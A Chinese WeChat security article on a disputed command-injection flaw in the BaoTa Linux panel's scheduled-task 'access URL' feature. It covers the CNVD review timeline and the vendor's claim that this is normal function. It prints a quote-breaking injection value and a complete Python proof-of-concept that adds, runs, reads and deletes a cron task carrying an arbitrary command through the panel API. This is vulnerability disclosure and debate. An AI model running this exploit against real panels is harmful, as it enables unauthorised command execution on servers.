> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg4NDg2NTM3NQ==&mid=2247484808&idx=1&sn=5abe422c4016fe5301be0b7b67ce939e

#  关于漏洞“宝塔Linux面板存在任意命令执行”的说明  
原创 用砖头敲代码  表哥带我   2025-06-19 16:00  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pxKqYxJWy7MHqrAcwIGH5K7UvO9SFI4EkaH4ooCVsu7cll9674CjgclKxGIKcM5MNF5s7vnK2NjZ6tliaQ0FWNg/640?wx_fmt=gif&from=appmsg "")  
  
关于最近特别火的漏洞“宝塔Linux面板存在任意命令执行漏洞”，“表哥带我”及“隼目安全”公众号已联系到该”漏洞”的发现者，并与该”漏洞”的发现者展开一些对漏洞定义有关的对峙，经过了解发现该”漏洞”在一定层面上确为漏洞（定义），  
CNVD 审核时间线  
下内容为该“漏洞”的发现者的事情经过说明，“表哥带我”公众号小编对该说明文档内容无改动。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pxKqYxJWy7PZVHNNkiaicj7KnaO5w6yqAgzd09sN2uibRyfG2b8hjMUAZiaufMnqGyZticyoH2bf6ibuSyp7lcWROKJQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pxKqYxJWy7PZVHNNkiaicj7KnaO5w6yqAgQibRIcc7ft7lKmxPSZhU0ia7cibrdxn7B9ibeGzNBkZfHUEwdEEndxONZA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pxKqYxJWy7PZVHNNkiaicj7KnaO5w6yqAgZQQ4pSgbs8PmxDgzCsC8INKbhZRGbH0tRibeAJymVdyCias2KLbC5iaQQ/640?wx_fmt=png&from=appmsg "")  
  
接下来由CNVD用户“用**敲代码”来进行以下情况说明。请各位师傅们，不要以讹传讹，理性看待此事。  
### CNVD 审核时间线  
<table><thead><tr><th><section><span leaf="">时间</span></section></th><th><section><span leaf="">操作</span></section></th><th><section><span leaf="">审核意见</span></section></th></tr></thead><tbody><tr><td><section><span leaf="">2024-07-02 15:22:41</span></section></td><td><section><span leaf="">一级审核</span></section></td><td><section><span leaf="">驳回，要求提供 3 个以上互联网验证案例或本地代码审计证明</span></section></td></tr><tr><td><section><span leaf="">2025-06-10 10:50:52</span></section></td><td><section><span leaf="">一级审核</span></section></td><td><section><span leaf="">审核通过</span></section></td></tr><tr><td><section><span leaf="">2025-06-10 17:56:04</span></section></td><td><section><span leaf="">二级审核</span></section></td><td><section><span leaf="">审核通过</span></section></td></tr><tr><td><section><span leaf="">2025-06-13 16:23:00</span></section></td><td><section><span leaf="">处置</span></section></td><td><section><span leaf="">处置中</span></section></td></tr><tr><td><section><span leaf="">2025-06-17 10:08:36</span></section></td><td><section><span leaf="">三级审核</span></section></td><td><section><span leaf="">驳回，认为属于面板正常功能而非漏洞</span></section></td></tr></tbody></table>### 认知分歧  
  
这个漏洞是CNVD用户“用砖头敲代码”于2024年06月23日首次提交CNVD平台，并非网传“黄豆安全实验室”。并且在2024年07月24日驳回，驳回原因为“您好！通用型漏洞需要提供互联网案例或者是本地代码审计证明其通用性（包括跟进函数和调试代码过程），如果提供互联网案例请提供至少3个以上验证成功漏洞案例（包括漏洞URL、截图、步骤等详细信息）”，首次提交是2024年在为客户开发程序时发现利用本应用于"访问URL"的功能可以超出功能  
"访问URL"  
能力进行命令执行。于2025年进行二次编辑，补充本地代码审计部分文档，于2025年06月10日再次提交CNVD平台。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pxKqYxJWy7PZVHNNkiaicj7KnaO5w6yqAgr7QFe4AkVyxPmebKL71C5KVacaps76M6Zu9Q8rQ7BSVmo4Xib35baCw/640?wx_fmt=png&from=appmsg "")  
  
关于网传图片“关于宝塔Linux面板存在命令执行漏洞的情况通报.docx”，该文件并非某些公众号所说的人为刻意伪造，而是在CNVD平台通过漏洞详细页面下载的。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pxKqYxJWy7PZVHNNkiaicj7KnaO5w6yqAgQuAZ5GEqkxozp38icsXcsXoHZ5fVibZicqBriaOs3FGxNOytVG65BPv2IQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/pxKqYxJWy7PZVHNNkiaicj7KnaO5w6yqAgU7z51tcuh29ia3LZnSRkFiaQQGmyulHicuIvXwSmPsFNYPN7l9fBp1Jow/640?wx_fmt=jpeg "")  
  
2025年06月16日，CNVD向宝塔Linux面板官方发送“关于宝塔Linux面板存在命令执行漏洞的情况通报.docx”，宝塔Linux面板官方于2025年06月17日向CNVD反馈：无风险。  
  
大部分师傅可能不太关心这些，因为真正让这个事情变成“网传”的，还是因为下面这张被打上厚码的聊天记录截图。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/pxKqYxJWy7PZVHNNkiaicj7KnaO5w6yqAgGuoqT8H4jyhAmyksvH65atLvIryzSwYNjHgib5cISp8G6D50O9HgQQQ/640?wx_fmt=jpeg "")  
  
这个聊天，其实就是在群里随口胡诌的，比如说宝塔面板的终端可以任意执行命令，又比如说文件管理那里可以任意读取文件，电脑的powershell可以执行命令等云云。本来就是玩梗，大家娱乐就好，直到有心人不知道是为了博流量还是信以为真，开始转载所谓的“宝塔Linux面板存在任意执行命令漏洞”。  
  
那么，事实的真相到底是什么呢？我相信很多师傅都很关心这个答案。其实答案很简单，我认为这个漏洞是真实的。下面就让我开始为各位师傅，揭秘这个漏洞的神秘面纱。  
  
2025 年 6 月 17 日，宝塔官方在回应中强调："所谓 ' 风险 ' 系指密钥泄露、账号被盗用等外部恶意场景下的非预期利用，并非功能设计缺陷"，将其类比为 "SSH 密码泄露导致的风险不能定义为 SSH 功能漏洞"。但“用**敲代码”指出，该漏洞本质是输入参数过滤缺失导致的命令注入，  
总而言之该漏洞  
与正常运维功能存在本质区别。  
  
漏洞存在于宝塔Linux面板 -> 计划任务 -> 添加/编辑计划任务 -> 任务类型[访问URL-GET/POST]  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pxKqYxJWy7PZVHNNkiaicj7KnaO5w6yqAgZ2ibb53OHnQfWpciblLSfY4pGk47u6jeRFEFv5GibW3f1iaT3OZDuQ438g/640?wx_fmt=png&from=appmsg "")  
  
按照宝塔面板于2025年06月17日发布的公告来看，“所谓‘风险’，系指密钥泄露、账号被盗用等外部恶意场景下的非预期利用，但这并非功能设计缺陷”  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pxKqYxJWy7PZVHNNkiaicj7KnaO5w6yqAgCUVdyFKxseqjln1zjDfxW4xEMLswxI1tGZXicpAafugA3keI0micsadg/640?wx_fmt=png&from=appmsg "")  
  
那么我们继续往下看这个漏洞，当输入以下URL时，因为宝塔没有过滤URL中的单引号，导致写入/www/server/cron中的文件，发生截断。  
  
导致除了原本应储存的命令除了curl之外，还可以写入自定义的命令。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pxKqYxJWy7PZVHNNkiaicj7KnaO5w6yqAgJMvuOk6PlunlFftFD65eRzOgEm3nUS8sOWoAaGSbwTBmPy5CAEFppQ/640?wx_fmt=png&from=appmsg "")  
  
查看F12的内容，定位到关键代码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pxKqYxJWy7PZVHNNkiaicj7KnaO5w6yqAg8Np4tIsT94JhssFU2SibIticAicIMBzjv0YTufAcnBrSWAj0EZtMsvM4g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pxKqYxJWy7PZVHNNkiaicj7KnaO5w6yqAgMjnJE1rEIPtaq1IzS0gqpjcnBP3K8UWcro8RdFtS6IA7M0OYxFnr3A/640?wx_fmt=png&from=appmsg "")  
  
然后我们再看看日志，确实写入的ifconfig已经被成功执行了。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pxKqYxJWy7PZVHNNkiaicj7KnaO5w6yqAgKaLkfE46L4TTbKU7iaS23BYq05mYX8M2kpMoYpxz6In7f7KOcBic940Q/640?wx_fmt=png&from=appmsg "")  
  
漏洞产生的原因，就是因为没过滤输入的参数，导致它像SQL注入一样，将原本的命令截断，可以运行更多命令。感兴趣的师傅，可以去读宝塔Linux面板/www/server/panel/class/crontab.py文件，关于sType为toUrl时的相关代码。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pxKqYxJWy7PZVHNNkiaicj7KnaO5w6yqAgtkKTerH93IWEXINInSZrEcwMnQnotK7lxblichyJ55vEW8ZEQqwZK7g/640?wx_fmt=png&from=appmsg "")  
  
发现只是普通拼接字符串，并未进行相关参数的转移或者过滤  
  
继续向下寻找代码，发现直接写入本地文件中  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pxKqYxJWy7PZVHNNkiaicj7KnaO5w6yqAgBSZhXxibsIB8A37Qca9bBqjhsV7J7l70h9yV96obndqZztS4IRxk2fQ/640?wx_fmt=png&from=appmsg "")  
  
漏洞必要条件(任一即可)  
1. 需要登陆宝塔Linux面板  
  
1. 宝塔Linux面板开启api接口并且拿到密钥  
  
漏洞成因  
  
在宝塔Linux面板中的
```
计划任务
```

  
功能，在添加
```
访问URL
```

  
项目时，会在服务器上的
```
/www/server/cron/
```

  
目录中生成一个类似于下面的文件  

```
#!/bin/bash
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
export PATH
curl -sS --connect-timeout 10 -m 3600 '【输入的url】'
echo &#34;----------------------------------------------------------------------------&#34;
endDate=`date +&#34;%Y-%m-%d %H:%M:%S&#34;`
echo &#34;★[$endDate] Successful&#34;
echo &#34;----------------------------------------------------------------------------&#34;


```

  
由于在
```
/www/server/panel/class/crontab.py
```

  
文件中的
```
AddCrontab
```

  
函数中，没有检测输入url是否存在危险字符，所以导致可以通过引号来截断原本的url，使其达到任意命令执行的目的。  
  
例如： 正常输入url为 
```
https://www.baidu.com
```

  
，但是可以通过输入引号像这样来截断 
```
https://www.baidu.com' && ifconfig && echo '
```

  
生成的文件为：  

```
#!/bin/bash
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
export PATH
curl -sS --connect-timeout 10 -m 3600 'https://www.baidu.com' && ifconfig && echo ''
echo &#34;----------------------------------------------------------------------------&#34;
endDate=`date +&#34;%Y-%m-%d %H:%M:%S&#34;`
echo &#34;★[$endDate] Successful&#34;
echo &#34;----------------------------------------------------------------------------&#34;


```

  
这样便可以做到访问url的同时，执行
```
ifconfig
```

  
命令  
  
POC代码  

```
import hashlib
import json
import time

import requests


class bt_panel:

    def __init__(self, bt_panel=None, bt_key=None):
       self.__BT_PANEL = 'http://xxx.xxx.xxx.xxx:8888'
       self.__BT_KEY = 'key'
       if bt_panel:
          self.__BT_PANEL = bt_panel
          self.__BT_KEY = bt_key

       # 添加计划任务

    def add_crontab(self, request_url):
       # 拼接URL地址
       url = self.__BT_PANEL + '/crontab?action=AddCrontab'

       # 准备POST数据
       p_data = self.__get_key_data()  # 取签名
       p_data['name'] = '测试宝塔Linux面板任意命令执行'
       p_data['type'] = 'week'
       p_data['where1'] = ''
       p_data['hour'] = 1
       p_data['minute'] = 30
       p_data['week'] = 1
       p_data['sType'] = 'toUrl'
       p_data['sBody'] = ''
       p_data['sName'] = ''
       p_data['backupTo'] = ''
       p_data['save'] = ''
       p_data['urladdress'] = request_url
       p_data['save_local'] = 1
       p_data['notice'] = ''
       p_data['notice_channel'] = ''
       p_data['datab_name'] = ''
       p_data['tables_name'] = ''

       result = self.__http_post_cookie(url, p_data)
       return json.loads(result)

    def start_crontab(self, id):
       url = self.__BT_PANEL + '/crontab?action=StartTask'

       p_data = self.__get_key_data()
       p_data['id'] = id

       result = self.__http_post_cookie(url, p_data)
       return json.loads(result)

    def get_logs(self, id):
       url = self.__BT_PANEL + '/crontab?action=GetLogs'

       p_data = self.__get_key_data()
       p_data['id'] = id

       result = self.__http_post_cookie(url, p_data)
       return json.loads(result)

    def del_crontab(self, id):
       url = self.__BT_PANEL + '/crontab?action=DelCrontab'

       p_data = self.__get_key_data()
       p_data['id'] = id
       result = self.__http_post_cookie(url, p_data)
       return json.loads(result)

    def poc(self, cmd):
       data = self.add_crontab(f&#34;https://www.baidu.com' && {cmd} && echo '&#34;)
       if data['status'] is not True:
          returnprint(&#34;该主机不存在此漏洞&#34;)
       print(f&#34;正在运行命令：{cmd}&#34;)
       start = self.start_crontab(data['id'])
       if start['status'] is not True:
          returnprint(&#34;命令运行失败！&#34;)
       print(&#34;正在获取命令运行结果&#34;)
       time.sleep(3)
       logs = self.get_logs(data['id'])
       if logs['status'] is not True:
          returnprint(&#34;命令运行失败或未运行！&#34;)
       print(f&#34;命令运行结果：\n{logs['msg']}&#34;)
       self.del_crontab(data['id'])

    def __get_md5(self, s):
       m = hashlib.md5()
       m.update(s.encode('utf-8'))
       return m.hexdigest()


       # 构造带有签名的关联数组

    def __get_key_data(self):
       now_time = int(time.time())
       p_data = {
          'request_token': self.__get_md5(str(now_time) + '' + self.__get_md5(self.__BT_KEY)),
          'request_time': now_time
       }
       return p_data

    def __http_post_cookie(self, url, p_data, timeout=1800):
       return requests.post(url, data=p_data, timeout=timeout).text


if __name__ == '__main__':
    my_api = bt_panel()

    # 调用get_logs方法
    r_data = my_api.poc(&#34;ifconfig&#34;)

    # 打印响应数据
    print(r_data)


```

  
那么现在，我们继续把焦点放到宝塔的公告上，首先，计划任务的访问URL是否为“外部恶意场景下的非预期利用”呢？我认为不算，  
因为宝塔设计这个功能的重点，应该是“访问URL”，而不是“通过CURL命令来访问URL”。  
  
但是现在，因为宝塔并没有过滤输入的参数，导致命令发生截断。我认为，这个功能是不够“安全”的。我做了十几年开发，这种情况厂商的正确做法应该是积极修复，而不是在争论到底有没有会去利用这个，也不是说因为  
利用难度太大了，我就不去修复。  
  
宝塔Linux面板作为一款百万级的产品，我不是说它不够好，而是它面对这种"BUG"的时候不够上心。经过我的测试，这个计划任务是可以通过宝塔Linux面板的API接口访问到。我们假设一个极端的环境，例如现在很流行的第三方ACME客户端，若是它调用了宝塔Linux面板的计划任务接口，并且也很放心的将输入“交给”用户，同样没有过滤。那么是否就出现了宝塔公告中所说的“  
外部恶意场景下的非预期利用”呢。  
  
讲到这里，感觉篇幅也差不多了。不过多占用师傅的休息/摸鱼时间了，既然宝塔发公告说这个不算漏洞，那么各位师傅们，就将这个小BUG作为宝塔的彩蛋来看吧，看看这种小概率事件会不会被师傅们碰到，万一真的用计划任务给宝塔提权了，那乐子就大了。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/pxKqYxJWy7PZVHNNkiaicj7KnaO5w6yqAgaVS7Lgazd0ibPwgVokDg2bIj84GhvseoJxUHCST545icjxMTEGAmmskg/640?wx_fmt=jpeg&from=appmsg "")  
  
**扫码关注我们**  
  
微信公众号：表哥带我  
  
本文供稿：用砖头敲代码  
  
  
